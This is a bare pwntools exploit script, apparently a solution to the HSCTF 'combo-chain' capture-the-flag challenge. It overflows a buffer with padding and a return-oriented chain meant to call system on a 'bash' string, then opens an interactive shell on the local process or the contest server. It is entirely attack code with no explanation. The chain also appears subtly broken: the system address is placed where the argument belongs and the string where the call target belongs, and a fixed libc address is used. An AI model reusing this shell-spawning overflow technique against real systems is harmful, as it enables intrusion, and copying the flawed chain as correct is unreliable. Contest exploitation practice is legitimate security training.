#!/usr/bin/env python

from pwn import *
SERVER = False
if SERVER:
	host, port = 'pwn.hsctf.com', 2345
	p = remote(host, port)
else:
	p = process('./combo-chain')

rdi_pop = 0x0401263
bash = 0x402031
system = 0x7ffff7f7590f


print p.recv()
#bash = 0x402051
#rdi_pop = 0x0000000000401273
#craft payload
padding = "A"*16
payload = padding
payload+= p64(rdi_pop)
payload+= p64(system)
payload+= p64(bash)
p.sendline(payload)
p.interactive()